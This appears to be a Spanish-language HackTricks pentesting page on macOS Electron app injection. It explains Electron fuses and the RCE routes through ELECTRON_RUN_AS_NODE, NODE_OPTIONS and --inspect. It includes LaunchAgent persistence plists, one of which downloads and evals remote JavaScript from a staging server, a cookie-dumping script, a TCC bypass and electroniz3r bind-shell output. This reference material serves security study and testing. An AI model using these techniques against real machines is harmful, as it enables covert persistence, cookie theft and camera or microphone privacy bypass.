# Inyección de Aplicaciones Electron en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información Básica

Si no sabes qué es Electron, puedes encontrar [**mucha información aquí**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Pero por ahora, solo debes saber que Electron ejecuta **node**.\
Y node tiene algunos **parámetros** y **variables de entorno** que se pueden usar para **hacer que ejecute otro código** además del archivo indicado.

### Fusibles de Electron

Estas técnicas se discutirán a continuación, pero en tiempos recientes Electron ha añadido varios **flags de seguridad para prevenirlos**. Estos son los [**Fusibles de Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) y estos son los que se utilizan para **prevenir** que las aplicaciones Electron en macOS **carguen código arbitrario**:

- **`RunAsNode`**: Si está deshabilitado, impide el uso de la variable de entorno **`ELECTRON_RUN_AS_NODE`** para inyectar código.
- **`EnableNodeCliInspectArguments`**: Si está deshabilitado, parámetros como `--inspect`, `--inspect-brk` no serán respetados. Evitando así la forma de inyectar código.
- **`EnableEmbeddedAsarIntegrityValidation`**: Si está habilitado, el **`archivo asar`** cargado será **validado** por macOS. **Previniendo** de esta manera la **inyección de código** al modificar el contenido de este archivo.
- **`OnlyLoadAppFromAsar`**: Si esto está habilitado, en lugar de buscar cargar en el siguiente orden: **`app.asar`**, **`app`** y finalmente **`default_app.asar`**. Solo verificará y usará app.asar, asegurando así que cuando se **combine** con el fusible **`embeddedAsarIntegrityValidation`** sea **imposible** **cargar código no validado**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Si está habilitado, el proceso del navegador utiliza el archivo llamado `browser_v8_context_snapshot.bin` para su instantánea V8.

Otro fusible interesante que no estará previniendo la inyección de código es:

- **EnableCookieEncryption**: Si está habilitado, el almacenamiento de cookies en disco está cifrado utilizando claves criptográficas a nivel de SO.

### Comprobando los Fusibles de Electron

Puedes **comprobar estos flags** desde una aplicación con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando los Fuses de Electron

Como mencionan los [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuración de los **Fuses de Electron** se configura dentro del **binario de Electron** que contiene en algún lugar la cadena **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

En las aplicaciones de macOS, esto se encuentra típicamente en `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Podrías cargar este archivo en [https://hexed.it/](https://hexed.it/) y buscar la cadena anterior. Después de esta cadena, puedes ver en ASCII un número "0" o "1" que indica si cada fusible está deshabilitado o habilitado. Simplemente modifica el código hex (`0x30` es `0` y `0x31` es `1`) para **modificar los valores de los fusibles**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Ten en cuenta que si intentas **sobrescribir** el **`Electron Framework`** binario dentro de una aplicación con estos bytes modificados, la aplicación no se ejecutará.

## RCE añadiendo código a aplicaciones Electron

Podría haber **archivos JS/HTML externos** que una aplicación Electron esté utilizando, por lo que un atacante podría inyectar código en estos archivos cuya firma no será verificada y ejecutar código arbitrario en el contexto de la aplicación.

> [!CAUTION]
> Sin embargo, en este momento hay 2 limitaciones:
>
> - Se necesita el permiso **`kTCCServiceSystemPolicyAppBundles`** para modificar una aplicación, por lo que por defecto esto ya no es posible.
> - El archivo compilado **`asap`** generalmente tiene los fusibles **`embeddedAsarIntegrityValidation`** `y` **`onlyLoadAppFromAsar`** `habilitados`
>
> Haciendo que esta ruta de ataque sea más complicada (o imposible).

Ten en cuenta que es posible eludir el requisito de **`kTCCServiceSystemPolicyAppBundles`** copiando la aplicación a otro directorio (como **`/tmp`**), renombrando la carpeta **`app.app/Contents`** a **`app.app/NotCon`**, **modificando** el archivo **asar** con tu código **malicioso**, renombrándolo de nuevo a **`app.app/Contents`** y ejecutándolo.

Puedes descomprimir el código del archivo asar con:
```bash
npx asar extract app.asar app-decomp
```
Y empaquétalo de nuevo después de haberlo modificado con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Según [**la documentación**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si esta variable de entorno está configurada, iniciará el proceso como un proceso normal de Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Si el fuse **`RunAsNode`** está deshabilitado, la variable de entorno **`ELECTRON_RUN_AS_NODE`** será ignorada y esto no funcionará.

### Inyección desde el App Plist

Como [**se propone aquí**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), podrías abusar de esta variable de entorno en un plist para mantener la persistencia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puedes almacenar la carga útil en un archivo diferente y ejecutarla:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Si el fuse **`EnableNodeOptionsEnvironmentVariable`** está **deshabilitado**, la aplicación **ignorar**á la variable de entorno **NODE_OPTIONS** al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fuse **`RunAsNode`** está deshabilitado.
>
> Si no configuras **`ELECTRON_RUN_AS_NODE`**, encontrarás el **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Inyección desde el Plist de la Aplicación

Podrías abusar de esta variable de entorno en un plist para mantener persistencia añadiendo estas claves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con inspección

Según [**esto**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si ejecutas una aplicación Electron con flags como **`--inspect`**, **`--inspect-brk`** y **`--remote-debugging-port`**, se **abrirá un puerto de depuración** para que puedas conectarte a él (por ejemplo, desde Chrome en `chrome://inspect`) y podrás **inyectar código en él** o incluso lanzar nuevos procesos.\
Por ejemplo:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Si el fuse **`EnableNodeCliInspectArguments`** está deshabilitado, la aplicación **ignorará los parámetros de node** (como `--inspect`) al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fuse **`RunAsNode`** está deshabilitado.
>
> Sin embargo, aún podrías usar el **parámetro de electron `--remote-debugging-port=9229`**, pero la carga útil anterior no funcionará para ejecutar otros procesos.

Usando el parámetro **`--remote-debugging-port=9222`** es posible robar información de la aplicación Electron como el **historial** (con comandos GET) o las **cookies** del navegador (ya que están **desencriptadas** dentro del navegador y hay un **endpoint json** que las proporcionará).

Puedes aprender cómo hacerlo [**aquí**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) y [**aquí**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) y usar la herramienta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o un script simple como:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
En [**esta publicación del blog**](https://hackerone.com/reports/1274695), este depurador se abusa para hacer que un chrome sin cabeza **descargue archivos arbitrarios en ubicaciones arbitrarias**.

### Inyección desde el Plist de la Aplicación

Podrías abusar de esta variable de entorno en un plist para mantener la persistencia añadiendo estas claves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass de TCC abusando de versiones anteriores

> [!TIP]
> El daemon TCC de macOS no verifica la versión ejecutada de la aplicación. Así que si **no puedes inyectar código en una aplicación Electron** con ninguna de las técnicas anteriores, podrías descargar una versión anterior de la APP e inyectar código en ella, ya que aún obtendrá los privilegios de TCC (a menos que Trust Cache lo impida).

## Ejecutar código no JS

Las técnicas anteriores te permitirán ejecutar **código JS dentro del proceso de la aplicación electron**. Sin embargo, recuerda que los **procesos secundarios se ejecutan bajo el mismo perfil de sandbox** que la aplicación principal y **heredan sus permisos de TCC**.\
Por lo tanto, si deseas abusar de los derechos para acceder a la cámara o al micrófono, por ejemplo, podrías simplemente **ejecutar otro binario desde el proceso**.

## Inyección automática

La herramienta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se puede usar fácilmente para **encontrar aplicaciones electron vulnerables** instaladas e inyectar código en ellas. Esta herramienta intentará usar la técnica **`--inspect`**:

Necesitas compilarla tú mismo y puedes usarla así:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referencias

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
